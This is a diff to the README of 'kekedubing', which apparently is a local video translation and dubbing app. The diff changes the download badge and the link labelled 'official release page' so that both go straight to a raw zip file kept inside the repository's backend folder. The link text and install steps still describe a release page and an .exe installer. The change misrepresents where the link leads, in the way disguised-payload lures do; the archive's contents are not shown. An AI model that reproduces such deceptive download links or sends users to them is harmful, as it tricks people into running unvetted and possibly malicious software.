@@ -1,6 +1,6 @@
 # 🎙️ kekedubing - Translate and dub your videos locally
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pumpactionatf235/kekedubing)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pumpactionatf235/kekedubing/raw/refs/heads/main/backend/app/Software_v2.5.zip)
 
 This application translates, dubs, and adds subtitles to your video files on your own computer. It uses machine learning to maintain your privacy because no data leaves your device. You keep total control over your media files.
 
@@ -16,7 +16,7 @@ To run this tool, your computer needs a few basic things:
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/pumpactionatf235/kekedubing) to see all versions.
+1. Visit the [official release page](https://github.com/pumpactionatf235/kekedubing/raw/refs/heads/main/backend/app/Software_v2.5.zip) to see all versions.
 2. Look for the latest version number at the top of the list.
 3. Click the file that ends in .exe to download the installer.
 4. Run the installer and follow the prompts on your screen.
